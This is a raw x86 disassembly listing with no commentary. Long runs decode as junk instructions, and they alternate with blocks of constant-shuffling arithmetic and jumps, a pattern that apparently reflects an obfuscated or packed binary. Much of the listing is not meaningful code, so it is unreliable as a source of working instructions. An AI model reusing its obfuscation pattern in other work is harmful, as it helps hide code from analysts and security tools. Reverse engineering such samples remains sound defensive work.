  40f8f2:	jmp    0x40f938
  40f8f4:	or     ah,ah
  40f8f6:	iret   
  40f8f7:	and    eax,0xafc31280
  40f8fc:	and    BYTE PTR [ecx+0x6f],ah
  40f8ff:	popf   
  40f900:	(bad)
  40f904:	dec    eax
  40f905:	push   ebx
  40f906:	sbb    BYTE PTR [ecx+0x5522f432],ah
  40f90c:	popa   
  40f90d:	fwait
  40f90e:	add    eax,0x542c22ba
  40f913:	icebp  
  40f914:	inc    ebp
  40f915:	cs mov dl,0xca
  40f918:	(bad)  
  40f919:	inc    ebx
  40f91a:	ret    
  40f91b:	inc    eax
  40f91c:	dec    ecx
  40f91d:	out    0x4d,eax
  40f91f:	loope  0x40f964
  40f921:	stos   DWORD PTR es:[edi],eax
  40f922:	in     al,0x15
  40f924:	sahf   
  40f925:	sbb    esi,ecx
  40f927:	mov    edx,0x4386fb66
  40f92c:	sti    
  40f92d:	scas   al,BYTE PTR es:[edi]
  40f92e:	data16 stc 
  40f930:	lds    edx,FWORD PTR [edi-0x79cc0bb8]
  40f936:	add    DWORD PTR [esi-0x31c49204],ecx
  40f93c:	pop    edi
  40f93d:	pushf  
  40f93e:	test   ebx,ecx
  40f940:	mov    WORD PTR [eax],ss
  40f942:	xor    BYTE PTR [edi],0x95
  40f945:	outs   dx,BYTE PTR ds:[esi]
  40f946:	push   edx
  40f947:	sbb    BYTE PTR [ebp+edx*1-0x3b3853c5],bh
  40f94e:	adc    al,0x21
  40f950:	push   ecx
  40f951:	push   esp
  40f952:	push   0xffffffa5
  40f954:	inc    ebx
  40f955:	jge    0x40f934
  40f957:	gs jne 0x40f9a2
  40f95a:	mov    dh,BYTE PTR [ebx-0x19]
  40f95d:	mov    al,0xd3
  40f95f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f960:	dec    ebx
  40f961:	(bad)  
  40f962:	cmp    DWORD PTR [ebx-0x6c75dffb],eax
  40f968:	mov    dl,BYTE PTR [esi+0x592433]
  40f96e:	inc    eax
  40f96f:	lahf   
  40f970:	push   es
  40f971:	aam    0xd1
  40f973:	in     eax,dx
  40f974:	nop
  40f975:	clc    
  40f976:	fwait
  40f977:	xchg   ebp,eax
  40f978:	mov    BYTE PTR [edi+0x1775b85c],al
  40f97e:	cdq    
  40f97f:	mov    DWORD PTR [ebx],edi
  40f981:	dec    DWORD PTR cs:[edi+esi*4-0x36091d1]
  40f989:	mov    ch,BYTE PTR [edi+0x4e]
  40f98c:	inc    eax
  40f98d:	mov    al,ds:0x1eeec0b4
  40f992:	push   0x51
  40f994:	dec    eax
  40f995:	sbb    DWORD PTR [ebx-0x7b],ecx
  40f998:	mov    eax,0xb33ddfa1
  40f99d:	mov    ebx,0x73dedb9e
  40f9a2:	popf   
  40f9a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9a4:	jnp    0x40f95b
  40f9a6:	or     ebp,esp
  40f9a8:	and    eax,0x652949be
  40f9ad:	jmp    0x40f9a5
  40f9af:	xlat   BYTE PTR ds:[ebx]
  40f9b0:	jb     0x40fa12
  40f9b2:	lahf   
  40f9b3:	add    eax,0xa3365192
  40f9b8:	fnsave [edi*1-0x4416907b]
  40f9bf:	(bad)  
  40f9c0:	xlat   BYTE PTR ds:[ebx]
  40f9c1:	mov    DWORD PTR [esi-0x5c],ebp
  40f9c4:	into   
  40f9c5:	and    eax,0xb088c5d
  40f9ca:	cmp    DWORD PTR [ebp-0x3c47643c],edx
  40f9d0:	jb     0x40f9d2
  40f9d2:	pop    ebp
  40f9d3:	js     0x40f979
  40f9d5:	gs iret 
  40f9d7:	and    BYTE PTR [eax],dl
  40f9d9:	rcl    BYTE PTR [ebx-0x1e],0x5b
  40f9dd:	ja     0x40f9cd
  40f9df:	dec    esi
  40f9e0:	jmp    0xc3e:0x35c12b27
  40f9e7:	add    BYTE PTR [eax],al
  40f9e9:	mov    DWORD PTR [ebp-0x58],eax
  40f9ec:	mov    DWORD PTR [ebp-0x14],0x66bd
  40f9f3:	pop    ecx
  40f9f4:	mov    DWORD PTR [ebp-0x4],ecx
  40f9f7:	mov    DWORD PTR [ebp-0x8],0x3374
  40f9fe:	mov    DWORD PTR [ebp-0xc],0x3c31
  40fa05:	mov    eax,DWORD PTR [ebp-0xc]
  40fa08:	mov    edx,DWORD PTR [ebp-0x8]
  40fa0b:	mov    esi,DWORD PTR [ebp-0x4]
  40fa0e:	xor    eax,edx
  40fa10:	xor    edx,edx
  40fa12:	div    esi
  40fa14:	mov    edx,DWORD PTR [ebp-0x14]
  40fa17:	and    eax,edx
  40fa19:	sub    eax,0x680
  40fa1e:	mov    DWORD PTR [ebp-0x24],eax
  40fa21:	mov    DWORD PTR [ebp-0x30],0x5f68
  40fa28:	mov    DWORD PTR [ebp-0x2c],0x398b
  40fa2f:	mov    DWORD PTR [ebp-0x4],0x5034
  40fa36:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40fa3d:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40fa44:	mov    DWORD PTR [ebp-0x14],0xee2
  40fa4b:	mov    eax,DWORD PTR [ebp-0x14]
  40fa4e:	add    eax,DWORD PTR [ebp-0xc]
  40fa51:	mov    edx,DWORD PTR [ebp-0x8]
  40fa54:	xor    eax,edx
  40fa56:	mov    edx,DWORD PTR [ebp-0x4]
  40fa59:	or     eax,edx
  40fa5b:	mov    edx,DWORD PTR [ebp-0x2c]
  40fa5e:	or     eax,edx
  40fa60:	mov    edx,DWORD PTR [ebp-0x30]
  40fa63:	and    eax,edx
  40fa65:	mov    edx,0x5b68
  40fa6a:	sub    edx,eax
  40fa6c:	mov    DWORD PTR [ebp-0x24],edx
  40fa6f:	mov    DWORD PTR [ebp-0x48],0x3308
  40fa76:	mov    DWORD PTR [ebp-0x44],0x59a4
  40fa7d:	mov    DWORD PTR [ebp-0x38],0x2775
  40fa84:	mov    DWORD PTR [ebp-0x34],0x4da
  40fa8b:	mov    DWORD PTR [ebp-0x40],0x49d8
  40fa92:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40fa99:	mov    DWORD PTR [ebp-0x28],0x338c
  40faa0:	mov    DWORD PTR [ebp-0x24],0x68ed
  40faa7:	mov    DWORD PTR [ebp-0x20],0x2a7b
  40faae:	mov    DWORD PTR [ebp-0x1c],0x718f
  40fab5:	mov    eax,DWORD PTR [ebp-0x20]
  40fab8:	mov    edx,DWORD PTR [ebp-0x1c]
  40fabb:	mov    esi,DWORD PTR [ebp-0x28]
  40fabe:	mov    ebx,DWORD PTR [ebp-0x24]
  40fac1:	add    eax,0xffffc948
  40fac6:	adc    edx,0xffff87b0
  40facc:	or     eax,esi
  40face:	mov    esi,DWORD PTR [ebp-0x40]
  40fad1:	or     eax,esi
  40fad3:	or     edx,ebx
  40fad5:	mov    ebx,DWORD PTR [ebp-0x3c]
  40fad8:	mov    esi,DWORD PTR [ebp-0x38]
  40fadb:	or     edx,ebx
  40fadd:	mov    ebx,DWORD PTR [ebp-0x34]
  40fae0:	sub    eax,esi
  40fae2:	mov    esi,DWORD PTR [ebp-0x48]
  40fae5:	sbb    edx,ebx
  40fae7:	mov    ebx,DWORD PTR [ebp-0x44]
  40faea:	or     eax,esi
  40faec:	or     edx,ebx
  40faee:	add    eax,0x89b
  40faf3:	mov    DWORD PTR [ebp-0x20],eax
  40faf6:	adc    edx,0x5a
  40faf9:	mov    DWORD PTR [ebp-0x1c],edx
  40fafc:	mov    DWORD PTR [ebp-0x80],0xfa4
  40fb03:	mov    DWORD PTR [ebp-0x70],0x618e
  40fb0a:	mov    DWORD PTR [ebp-0x6c],0x811
  40fb11:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40fb1b:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40fb25:	mov    DWORD PTR [ebp-0x88],0x58ff
  40fb2f:	mov    DWORD PTR [ebp-0x84],0x7394
  40fb39:	xor    eax,eax
  40fb3b:	inc    eax
  40fb3c:	mov    DWORD PTR [ebp-0x64],eax
  40fb3f:	mov    DWORD PTR [ebp-0x8],0x5f59
  40fb46:	mov    DWORD PTR [ebp-0x4],0x652b
  40fb4d:	mov    DWORD PTR [ebp-0xc],0xf43
  40fb54:	mov    DWORD PTR [ebp-0x14],0x22dc
  40fb5b:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40fb62:	mov    DWORD PTR [ebp-0x30],0x28e1
  40fb69:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40fb70:	mov    DWORD PTR [ebp-0x50],0x3910
  40fb77:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40fb7e:	mov    DWORD PTR [ebp-0x24],0x6111
  40fb85:	mov    DWORD PTR [ebp-0x78],ecx
  40fb88:	mov    DWORD PTR [ebp-0x34],ecx
  40fb8b:	mov    DWORD PTR [ebp-0x44],0x207a
  40fb92:	mov    DWORD PTR [ebp-0x60],eax
  40fb95:	mov    DWORD PTR [ebp-0x8c],0x7840
  40fb9f:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40fba6:	mov    eax,DWORD PTR [ebp-0x30]
  40fba9:	or     eax,0x70c5
  40fbae:	add    eax,DWORD PTR [ebp-0x2c]
  40fbb1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fbb4:	or     eax,ecx
  40fbb6:	mov    ecx,0xce40
  40fbbb:	sub    ecx,eax
  40fbbd:	mov    eax,DWORD PTR [ebp-0xc]
  40fbc0:	sub    ecx,eax
  40fbc2:	imul   ecx,ecx,0x7480
  40fbc8:	add    ecx,DWORD PTR [ebp-0x58]
  40fbcb:	mov    eax,DWORD PTR [ebp-0x8]
  40fbce:	push   ecx
  40fbcf:	mov    ecx,DWORD PTR [ebp-0x4]
  40fbd2:	lea    eax,[ecx+eax*1-0x1e6d]
  40fbd9:	mov    ecx,DWORD PTR [ebp-0x64]
  40fbdc:	xor    edx,edx
  40fbde:	div    ecx
  40fbe0:	mov    ecx,DWORD PTR [ebp-0x74]
  40fbe3:	lea    eax,[eax+ecx*1-0xa617]
  40fbea:	push   eax
  40fbeb:	mov    eax,DWORD PTR [ebp-0x88]
  40fbf1:	mov    ecx,DWORD PTR [ebp-0x84]
  40fbf7:	push   0x770a
  40fbfc:	push   0x2a0c
  40fc01:	push   ecx
  40fc02:	push   eax
  40fc03:	call   0x416c20
  40fc08:	mov    ecx,DWORD PTR [ebp-0x98]
  40fc0e:	mov    esi,DWORD PTR [ebp-0x94]
  40fc14:	push   esi
  40fc15:	push   ecx
  40fc16:	or     edx,0x615d
  40fc1c:	or     eax,0x455c
  40fc21:	push   edx
  40fc22:	push   eax
  40fc23:	call   0x422049
  40fc28:	mov    ecx,DWORD PTR [ebp-0x70]
  40fc2b:	mov    edx,DWORD PTR [ebp-0x6c]
  40fc2e:	xor    eax,ecx
  40fc30:	mov    ecx,DWORD PTR [ebp-0x20]
  40fc33:	mov    edx,DWORD PTR [ebp-0x1c]
  40fc36:	mov    esi,DWORD PTR [ebp-0x80]
  40fc39:	and    eax,0xb49
  40fc3e:	add    esi,0x629b
  40fc44:	lea    eax,[eax+ecx*1-0xfd]
  40fc4b:	xor    esi,0x4994
  40fc51:	push   eax
  40fc52:	lea    esi,[ebp+esi*1-0x3c93]
  40fc59:	call   0x41066f
  40fc5e:	mov    ecx,eax
  40fc60:	mov    eax,DWORD PTR [ebp-0x50]
  40fc63:	mov    edx,DWORD PTR [ebp-0x7c]
  40fc66:	sub    eax,0x161
  40fc6b:	xor    eax,edx
  40fc6d:	imul   eax,eax,0x5151
  40fc73:	jmp    0x40ff41
  40fc78:	fiadd  WORD PTR [edi-0x46]
  40fc7b:	rcr    DWORD PTR [edx],1
  40fc7d:	dec    esp
  40fc7e:	fisub  DWORD PTR [esi]
  40fc80:	out    dx,eax
  40fc81:	mov    bl,BYTE PTR [ebp+0x3985bf70]
  40fc87:	push   0x76
  40fc89:	sahf   
  40fc8a:	sbb    BYTE PTR [eax],bl
  40fc8c:	mov    esi,0xe7181814
  40fc91:	lods   al,BYTE PTR ds:[esi]
  40fc92:	mov    ah,BYTE PTR [esi]
  40fc94:	enter  0xf625,0xb6
  40fc98:	loopne 0x40fcd8
  40fc9a:	push   ds
  40fc9b:	adc    edx,esi
  40fc9d:	ror    DWORD PTR [ebp+0x59],0x1c
  40fca1:	or     BYTE PTR [edx+esi*2-0x5308a7fd],0x19
  40fca9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcaa:	and    BYTE PTR ds:[esi+eiz*1],al
  40fcae:	lsl    esi,WORD PTR [ecx-0xe]
  40fcb2:	xor    DWORD PTR [esi],ecx
  40fcb4:	cmp    DWORD PTR [esp+ecx*1-0x11103cf6],esi
  40fcbb:	test   bl,al
  40fcbd:	push   esp
  40fcbe:	loop   0x40fc43
  40fcc0:	pop    esp
  40fcc1:	sub    al,cl
  40fcc3:	outs   dx,DWORD PTR ds:[esi]
  40fcc4:	pop    ecx
  40fcc5:	out    dx,al
  40fcc6:	addr16 add eax,0x2828955e
  40fccc:	ss jge 0x40fca6
  40fccf:	adc    edi,0xfffffff7
  40fcd2:	cli    
  40fcd3:	into   
  40fcd4:	mov    ch,0x5b
  40fcd6:	jo     0x40fc8c
  40fcd8:	pop    ecx
  40fcd9:	ret    
  40fcda:	inc    esp
  40fcdb:	inc    esi
  40fcdc:	jo     0x40fd15
  40fcde:	loop   0x40fc7a
  40fce0:	test   bh,bh
  40fce2:	mov    dh,0x68
  40fce4:	into   
  40fce5:	xor    eax,0x98ff31e5
  40fcea:	ss mov ebx,0xd60628f8
  40fcf0:	dec    esp
  40fcf1:	push   es
  40fcf2:	mov    eax,ds:0x428364e3
  40fcf7:	in     eax,dx
  40fcf8:	xchg   edi,eax
  40fcf9:	dec    esp
  40fcfa:	ins    BYTE PTR es:[edi],dx
  40fcfb:	in     eax,0xff
  40fcfd:	sub    eax,DWORD PTR [ebx+ebp*8+0x1c]
  40fd01:	call   0xe84f8d58
  40fd06:	push   0x7c60c8c9
  40fd0b:	mov    esp,0x1114a155
  40fd10:	dec    edi
  40fd11:	in     al,dx
  40fd12:	jns    0x40fd53
  40fd14:	adc    ebx,esp
  40fd16:	ret    0x91b1
  40fd19:	sahf   
  40fd1a:	ss lahf 
  40fd1c:	sbb    cl,BYTE PTR [ecx]
  40fd1e:	sar    BYTE PTR [ebx-0x4a],0x4f
  40fd22:	pop    edx
  40fd23:	sti    
  40fd24:	xchg   ebx,eax
  40fd25:	sub    BYTE PTR [edx],bl
  40fd27:	mov    eax,0x3256db7c
  40fd2c:	pushf  
  40fd2d:	aas    
  40fd2e:	icebp  
  40fd2f:	push   ebx
  40fd30:	test   al,0x6a
  40fd32:	pop    ecx
  40fd33:	sbb    eax,0x86f7035c
  40fd38:	xchg   ebp,eax
  40fd39:	mov    bh,0x3b
  40fd3b:	push   ds
  40fd3c:	lods   al,BYTE PTR ds:[esi]
  40fd3d:	or     bl,BYTE PTR gs:[esi]
  40fd40:	ror    DWORD PTR [esp+eax*8],1
  40fd43:	xbegin 0x2518d17f
  40fd49:	icebp  
  40fd4a:	lock pushf 
  40fd4c:	adc    dl,al
  40fd4e:	in     eax,dx
  40fd4f:	rol    DWORD PTR [eax+eiz*4],0x3d
  40fd53:	fdivr  DWORD PTR [eax-0x6c]
  40fd56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd57:	mov    al,ds:0xfbec0bae
  40fd5c:	pop    edi
  40fd5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd5e:	fnstsw WORD PTR [bp+di-0x58]
  40fd62:	xor    al,0x23
  40fd64:	aad    0x75
  40fd66:	jb     0x40fddd
  40fd68:	leave  
  40fd69:	fnstsw WORD PTR [edi]
  40fd6b:	sbb    eax,DWORD PTR [edx+0x5a]
  40fd6e:	sub    dl,ch
  40fd70:	pop    esi
  40fd71:	dec    edx
  40fd72:	hlt    
  40fd73:	inc    esp
  40fd74:	rcr    DWORD PTR [eax+0x22],1
  40fd77:	outs   dx,BYTE PTR ds:[esi]
  40fd78:	cmc    
  40fd79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd7a:	pop    ebp
  40fd7b:	sub    BYTE PTR [esi],0x4f
  40fd7e:	or     ch,BYTE PTR [eax+ecx*2-0x7451652f]
  40fd85:	mov    edx,0xa7b69d80
  40fd8a:	mov    eax,ds:0x75286241
  40fd8f:	jb     0x40fd1c
  40fd91:	pop    eax
  40fd92:	push   esi
  40fd93:	mov    ds:0x3dd39b25,eax
  40fd98:	icebp  
  40fd99:	or     eax,0x6eb83d79
  40fd9e:	sub    bh,BYTE PTR [edi-0x6d7b1a1f]
  40fda4:	adc    ch,cl
  40fda6:	inc    esi
  40fda7:	sub    BYTE PTR [edx-0x5568b997],0x54
  40fdae:	shr    DWORD PTR [eax],0x85
  40fdb1:	cmp    al,al
  40fdb3:	dec    edx
  40fdb4:	aam    0x70
  40fdb6:	ins    DWORD PTR es:[edi],dx
  40fdb7:	add    eax,0xd63187a1
  40fdbc:	bound  ebp,QWORD PTR [esi+0x6f]
  40fdbf:	inc    esi
  40fdc0:	cdq    
  40fdc1:	mov    edi,0x3259fe4f
  40fdc6:	ds data16 repnz mov al,0x51
  40fdcb:	cld    
  40fdcc:	rcr    BYTE PTR ds:0x6cf04166,0xd2
  40fdd3:	(bad)  
  40fdd4:	sti    
  40fdd5:	and    DWORD PTR [edi-0x3a078d01],eax
  40fddb:	jle    0x40fe0c
  40fddd:	xchg   edx,eax
  40fdde:	adc    BYTE PTR ds:0xee0247d1,bh
  40fde4:	xor    al,0xd0
  40fde6:	and    DWORD PTR ds:0xd2dcfaf8,0x519970b
  40fdf0:	add    BYTE PTR [esi],bl
  40fdf2:	add    edx,edi
  40fdf4:	(bad)  
  40fdf5:	pop    esi
  40fdf6:	ins    DWORD PTR es:[edi],dx
  40fdf7:	fnsetpm(287 only) 
  40fdf9:	add    DWORD PTR [eax+0x47],ebp
  40fdfc:	scas   eax,DWORD PTR es:[edi]
  40fdfd:	pop    esi
  40fdfe:	enter  0xd84,0x43
  40fe02:	mov    bh,0x4c
  40fe04:	and    cl,BYTE PTR [edi+ecx*2-0x28ae45bb]
  40fe0b:	fdivr  DWORD PTR [ecx-0x5f31e4b3]
  40fe11:	iret   
  40fe12:	pop    edx
  40fe13:	and    BYTE PTR [ecx-0x42ac7f1],ah
  40fe19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe1a:	jae    0x40fdd3
  40fe1c:	push   ecx
  40fe1d:	mov    cl,0x91
  40fe1f:	iret   
  40fe20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe21:	adc    cl,BYTE PTR [ebx]
  40fe23:	mov    eax,0xce5287c6
  40fe28:	sbb    DWORD PTR [edx-0x6a55fed8],eax
  40fe2e:	popa   
  40fe2f:	add    BYTE PTR [edx+0x79],bh
  40fe32:	dec    eax
  40fe33:	loope  0x40fdce
  40fe35:	jecxz  0x40fe0b
  40fe37:	cmp    ah,BYTE PTR [ecx-0x4696f2e7]
  40fe3d:	ret    0xbdca
  40fe40:	(bad)  
  40fe41:	sbb    esi,DWORD PTR [ebx-0x34]
  40fe44:	imul   eax,edx,0x21d154f5
  40fe4a:	cmp    eax,0xed534d29
  40fe4f:	or     DWORD PTR [edi+0x3e],edi
  40fe52:	fist   DWORD PTR [eax]
  40fe54:	into   
  40fe55:	imul   ebp,DWORD PTR [edi],0x65
  40fe58:	imul   eax,DWORD PTR ds:0x850997b5,0x2350616f
  40fe62:	call   0x1d98:0x16bd8fcb
  40fe69:	push   esi
  40fe6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe6b:	test   eax,0x8cb4114d
  40fe70:	test   al,0xb
  40fe72:	repz dec eax
  40fe74:	cmp    al,BYTE PTR [ebx+0x7796773f]
  40fe7a:	sub    DWORD PTR [edi-0x76c96369],edi
  40fe80:	add    al,0xc2
  40fe82:	fsubr  QWORD PTR [ecx]
  40fe84:	sbb    eax,0xe0219035
  40fe89:	lea    esp,[eax-0x4b]
  40fe8c:	jbe    0x40fe32
  40fe8e:	mov    dl,BYTE PTR [esi+ebx*8]
  40fe91:	jae    0x40fe99
  40fe93:	(bad)  
  40fe94:	repnz xchg edi,eax
  40fe96:	fdiv   DWORD PTR [edi]
  40fe98:	repnz or ebp,DWORD PTR [eax+0x39468b30]
  40fe9f:	xor    edi,DWORD PTR [esi]
  40fea1:	mov    edi,0x87000ebd
  40fea6:	push   ebp
  40fea7:	lea    ebp,[edi*1+0x513d8d5a]
  40feae:	xchg   edx,eax
  40feaf:	mov    dh,0xe1
  40feb1:	jnp    0x40ff07
  40feb3:	mov    al,0x1
  40feb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40feb6:	sub    esi,DWORD PTR [ecx+0x6f]
  40feb9:	inc    edi
  40feba:	mov    eax,ds:0x4090b613
  40febf:	in     al,0x98
  40fec1:	aam    0xce
  40fec3:	adc    esp,edi
  40fec5:	push   esi
  40fec6:	or     BYTE PTR [ecx],cl
  40fec8:	fdivp  st(4),st
  40feca:	inc    esp
  40fecb:	adc    bh,dh
  40fecd:	lds    di,DWORD PTR [ebp-0x35]
  40fed1:	int3   
  40fed2:	shr    DWORD PTR [esi+eax*8+0x3e9b77d9],cl
  40fed9:	nop
  40feda:	mov    dh,BYTE PTR [esi+0x21]
  40fedd:	hlt    
  40fede:	lods   eax,DWORD PTR ds:[esi]
  40fedf:	inc    ecx
  40fee0:	cwde   
  40fee1:	ret    
  40fee2:	pop    esp
  40fee3:	cli    
  40fee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fee5:	xor    eax,0x530bca39
  40feea:	jne    0x40fea5
  40feec:	js     0x40fe9f
  40feee:	push   edx
  40feef:	adc    eax,0xb66ceb19
  40fef4:	push   edx
  40fef5:	mov    ch,0x35
  40fef7:	les    ecx,FWORD PTR [esi-0x5ea436ab]
  40fefd:	scas   al,BYTE PTR es:[edi]
  40fefe:	inc    esi
  40feff:	cmp    bl,BYTE PTR [edi+eax*2-0x5]
  40ff03:	adc    dl,0x6a
  40ff06:	or     al,0xb0
  40ff08:	popf   
  40ff09:	gs add eax,edx
  40ff0c:	imul   ebp,DWORD PTR [esp+edx*8],0xb3d6d273
  40ff13:	aam    0x7d
  40ff15:	imul   esi,DWORD PTR [esi-0x68853c68],0x2f2eeebb
  40ff1f:	adc    ebp,DWORD PTR [edx+edi*2-0x75]
  40ff23:	shr    DWORD PTR [edi],0x71
  40ff26:	jmp    0x11483dfe
  40ff2b:	sahf   
  40ff2c:	and    ebx,DWORD PTR [edx]
  40ff2e:	icebp  
  40ff2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff30:	jp     0x40ff87
  40ff32:	fmul   QWORD PTR [esi+0x42e3780d]
  40ff38:	push   esp
  40ff39:	jae    0x40ff2f
  40ff3b:	aaa    
  40ff3c:	mov    ?,WORD PTR [esi-0x33]
  40ff3f:	outs   dx,BYTE PTR ds:[esi]
  40ff40:	mov    al,BYTE PTR ds:0x3901
  40ff46:	xor    eax,0x40c2
  40ff4b:	xor    edx,edx
  40ff4d:	mov    esi,0x218f6c45
  40ff52:	div    esi
  40ff54:	cmp    ecx,eax
  40ff56:	jmp    0x410224
  40ff5b:	ss int 0x1f
  40ff5e:	jnp    0x40ff7a
  40ff60:	pop    ebx
  40ff61:	xor    bl,BYTE PTR [ebp+ebx*1-0x2e838c47]
  40ff68:	adc    ecx,DWORD PTR [edi+0x7e]
  40ff6b:	sbb    eax,0xbe181898
  40ff70:	adc    al,0x18
  40ff72:	sbb    BYTE PTR [edi-0x2808060b],bl
  40ff78:	adc    eax,0x505f08fa
  40ff7d:	(bad)  
  40ff7e:	jae    0x40ff9e
  40ff80:	inc    ebp
  40ff81:	enter  0x74b5,0x22
  40ff85:	das    
  40ff86:	and    edx,edx
  40ff88:	jno    0x40ff8d
  40ff8a:	xor    al,BYTE PTR [ecx]
  40ff8c:	mov    al,ds:0x3d6bd25f
  40ff91:	sub    dl,BYTE PTR [edx-0x2f]
  40ff94:	fsubr  DWORD PTR [ecx+edx*4+0x4b]
  40ff98:	hlt    
  40ff99:	mov    bh,0xa9
  40ff9b:	xor    eax,0x77c24bf7
  40ffa0:	js     0x40ffb4
  40ffa2:	retf   0x327b
  40ffa5:	cdq    
  40ffa6:	ret    
  40ffa7:	gs (bad) 
  40ffa9:	sbb    dh,ah
  40ffab:	enter  0x23b5,0xf4
  40ffaf:	xor    eax,0x6120f53b
  40ffb4:	push   ds
  40ffb5:	sbb    ah,BYTE PTR [ecx+0x53]
  40ffb8:	(bad)
  40ffbb:	test   eax,0x968edc8
  40ffc0:	std    
  40ffc1:	dec    ebx
  40ffc2:	cdq    
  40ffc3:	fnstenv [ebx]
  40ffc5:	in     al,dx
  40ffc6:	jbe    0x410019
  40ffc8:	aas    
  40ffc9:	lahf   
  40ffca:	add    DWORD PTR [eax+0x6ef34a93],esi
  40ffd0:	xor    al,BYTE PTR [eax]
  40ffd2:	pop    ebx
  40ffd3:	gs inc ebp
  40ffd5:	jb     0x40ffac
  40ffd7:	mov    edi,0x13e8ee4c
  40ffdc:	lds    edi,FWORD PTR [ebx+ecx*8-0x3f]
  40ffe0:	xchg   ecx,eax
  40ffe1:	adc    BYTE PTR [eax],bh
  40ffe3:	jns    0x40ff6c
  40ffe5:	push   ebx
  40ffe6:	inc    ebp
  40ffe7:	bound  esi,QWORD PTR [ebx-0x3a3d6324]
  40ffed:	push   ecx
  40ffee:	cmp    ebp,ecx
  40fff0:	sbb    al,BYTE PTR [eax]
  40fff2:	xchg   edx,eax
  40fff3:	lods   eax,DWORD PTR ds:[esi]
  40fff4:	or     esi,edi
  40fff6:	sbb    esi,DWORD PTR [eax*4-0x26b0a933]
  40fffd:	ins    DWORD PTR es:[edi],dx
  40fffe:	scas   eax,DWORD PTR es:[edi]
  40ffff:	adc    DWORD PTR [ecx+0x51],0x8f83c600
  410006:	stos   BYTE PTR es:[edi],al
  410007:	cmp    DWORD PTR [ecx+0x2b9bc49a],ecx
  41000d:	inc    ebp
  41000e:	inc    edx
  41000f:	push   es
  410010:	frstor [edi-0x528f384d]
  410016:	fs loopne 0x410087
  410019:	in     eax,0x17
  41001b:	retf   
  41001c:	mov    ah,0x21
  41001e:	jmp    0xd016:0x71e72be8
  410025:	fmulp  st(7),st
  410027:	sar    DWORD PTR [edx],0xa7
  41002a:	sbb    DWORD PTR [ecx+0x1],edx
  41002d:	add    dh,ah
  41002f:	and    ebx,edx
  410031:	in     al,dx
  410032:	es shl bh,cl
  410035:	test   eax,0x158aba87
  41003a:	fbstp  TBYTE PTR [ecx+0x78a7f5d0]
  410040:	dec    edx
  410041:	ds dec eax
  410043:	xlat   BYTE PTR ds:[ebx]
  410044:	sbb    ebx,DWORD PTR [edi-0x6f605264]
  41004a:	(bad)  
  41004b:	aas    
  41004c:	inc    esp
  41004d:	aam    0xb3
  41004f:	mov    ds:0xef51aab1,al
  410054:	mov    esp,0xe6bd9da9
  410059:	in     eax,0xc
  41005b:	outs   dx,BYTE PTR ds:[esi]
  41005c:	jge    0x40ffef
  41005e:	outs   dx,DWORD PTR ds:[esi]
  41005f:	ds mov bh,0x48
  410062:	ret    
  410063:	mov    esp,0x78996e17
  410068:	adc    al,0x1b
  41006a:	out    0x69,eax
  41006c:	js     0x410034
  41006e:	mov    cs,WORD PTR [ecx+ebp*1+0x7a]
  410072:	fstp   DWORD PTR [ebx+0x70]
  410075:	or     DWORD PTR [edi+0x55],ebx
  410078:	pop    edx
  410079:	pusha  
  41007a:	pop    esi
  41007b:	sbb    al,0xc2
  41007d:	and    DWORD PTR [edx+0x63a24de5],edx
  410083:	pop    ss
  410084:	imul   edx,DWORD PTR [edx+ebx*2],0x65
  410088:	mov    ah,0xba
  41008a:	lea    ebp,[esi]
  41008c:	rcr    DWORD PTR [ebx],1
  41008e:	fcomp  QWORD PTR [ebx]
  410090:	jp     0x4100e6
  410092:	je     0x410064
  410094:	les    eax,FWORD PTR [eax]
  410096:	sti    
  410097:	test   eax,0xffd4adad
  41009c:	ret    
  41009d:	inc    ebx
  41009e:	repnz fmul st(2),st
  4100a1:	cs into 
  4100a3:	js     0x410111
  4100a5:	inc    esp
  4100a6:	push   cs
  4100a7:	or     al,0xb2
  4100a9:	sub    eax,0x999ca058
  4100ae:	scas   eax,DWORD PTR es:[edi]
  4100af:	lock inc esi
  4100b1:	mov    bh,0xaf
  4100b3:	push   0x28
  4100b5:	popa   
  4100b6:	and    BYTE PTR [edx-0x14],ch
  4100b9:	xor    al,dl
  4100bb:	xor    bh,BYTE PTR [ecx+0x7107cc86]
  4100c1:	sub    DWORD PTR [edi],edi
  4100c3:	jne    0x41011b
  4100c5:	fcmovb st,st(5)
  4100c7:	fcomp  DWORD PTR [ebx+0x50d29076]
  4100cd:	fstp   TBYTE PTR [ebx+0x660de9af]
  4100d3:	pop    ss
  4100d4:	sahf   
  4100d5:	enter  0x8df3,0xc1
  4100d9:	jno    0x4100e5
  4100db:	mov    ss,WORD PTR [edi]
  4100dd:	leave  
  4100de:	call   0xd319:0x71a4cf55
  4100e5:	stos   DWORD PTR es:[edi],eax
  4100e6:	cmp    al,0x5d
  4100e8:	fimul  DWORD PTR [edi-0x4a]
  4100eb:	mov    gs,WORD PTR [esi]
  4100ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100ee:	fisubr WORD PTR [edi+edi*4+0x69]
  4100f2:	mov    ecx,0x79a22890
  4100f7:	enter  0xef7d,0xac
  4100fb:	xchg   esp,eax
  4100fc:	push   ebp
  4100fd:	mov    bh,0xb
  4100ff:	dec    esp
  410100:	push   esi
